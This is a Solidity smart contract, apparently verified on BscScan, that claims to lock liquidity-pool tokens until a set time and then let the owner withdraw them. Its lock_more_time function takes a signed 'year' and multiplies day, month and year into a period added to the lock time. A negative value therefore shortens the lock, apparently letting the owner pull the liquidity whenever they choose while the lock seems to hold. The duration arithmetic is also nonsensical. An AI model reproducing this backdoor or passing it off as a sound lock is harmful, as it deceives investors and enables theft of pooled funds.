/**
 *Submitted for verification at BscScan.com on 2023-05-14
*/

/**

 __    _____    __    _____ _____ _____ _____ ____     
|  |  |  _  |  |  |  |     |     |  |  |   __|    \    
|  |__|   __|  |  |__|  |  |   --|    -|   __|  |  |   
|_____|__|     |_____|_____|_____|__|__|_____|____/    

*/
// SPDX-License-Identifier: Unlicensed

pragma solidity 0.7.0;


interface IERC20 {

    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    
}


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}




contract LOCK_LP  {

    address public owner;
    uint256 public _lockTime;
    string  public _name = "LOCK_LP";
    
    constructor()  {
        owner = msg.sender;
       _lockTime = block.timestamp;
    }
    
    ////// function to see the lock time ///////
    
    function getlockTime() public view returns (uint256) {
        return _lockTime;
    }
    
    ////// Function to lock LP on the contract ///////

    function lock_more_time(uint256 day,uint256 month,int256 year) public  {
        require(msg.sender == owner, "only the owner can lock the liquidity");
        int256 _period = int(day) * int(month)* int(year);
        int _lockTimeMore = int(_lockTime) + _period;
        _lockTime = uint256(_lockTimeMore);
    }
   
    ///// function to send liquidity ///////
    
    function sendLP(address _LpAddres) public {
        require(block.timestamp > _lockTime , "The liquidity is locked");
        require(msg.sender == owner, "only the owner can send LP after the lock period");
        require(IERC20(_LpAddres).balanceOf(address(this)) > 0, "can not send 0 or negative");
        require((IERC20(_LpAddres).transfer(owner, IERC20(_LpAddres).balanceOf(address(this))) ) == true);
    }
    
     
    
}